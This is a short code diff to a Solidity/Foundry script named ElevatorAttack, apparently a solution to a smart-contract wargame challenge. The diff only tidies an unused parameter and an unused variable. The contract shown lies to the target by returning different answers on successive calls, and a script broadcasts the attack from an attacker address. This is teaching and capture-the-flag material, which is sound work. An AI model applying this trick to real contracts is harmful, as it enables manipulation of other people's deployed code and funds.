@@ -17,7 +17,7 @@ contract ElevatorAttack is Constants {
     /**
     * @notice The first time the function is called it will say it's not the first floor. All subsequent times, it will say it's the last floor.
     */
-    function isLastFloor(uint256 _floor) external returns (bool) {
+    function isLastFloor(uint256 /*_floor*/) external returns (bool) {
         bool result = answer;
         answer = true;
         return result;
@@ -32,8 +32,6 @@ contract ElevatorAttack is Constants {
 contract ElevatorAttacker is Constants, Script {
 
     function run() public {
-        IElevator victim = IElevator(ELEVATOR_ADDRESS);
-
         vm.startBroadcast(ATTACKER_ADDRESS);
         attack();
         vm.stopBroadcast();
